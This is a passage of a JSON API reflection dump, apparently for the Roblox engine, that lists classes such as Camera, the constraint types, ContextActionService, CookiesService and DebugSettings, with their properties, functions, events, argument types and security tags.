"tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGraphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChatFilter","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClusterPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":[],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":[],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"MoveToConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"StabilizingDistance","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"MoveToConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AzimuthalAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Instance","type":"Class","Name":"ContentFilter","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"outstandingRequests","Default":null},{"Type":"int","Name":"cacheSize","Default":null}],"Name":"SetFilterLimits","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFilterUrl","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":[],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetCacheSize","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetThreadPool","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"DeleteCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AltCdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AltCdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AvailablePhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"BlockMeshSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"CPU","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"CdnResponceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuSpeed","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ElapsedTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"LastCdnFailureTimeSpan","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFaultsPerSecond","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFileBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"PixelShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateWorkingSetBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProcessCores","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"ProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProfilingWindow","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RAM","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportExtendedMachineConfiguration","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"Resolution","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"RobloxRespoceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalPhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"VertexShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VirtualBytes","tags":["readonly"],"Class":"DebugSettings"},{"ReturnType":"void","Arguments":[],"Name":"LegacyScri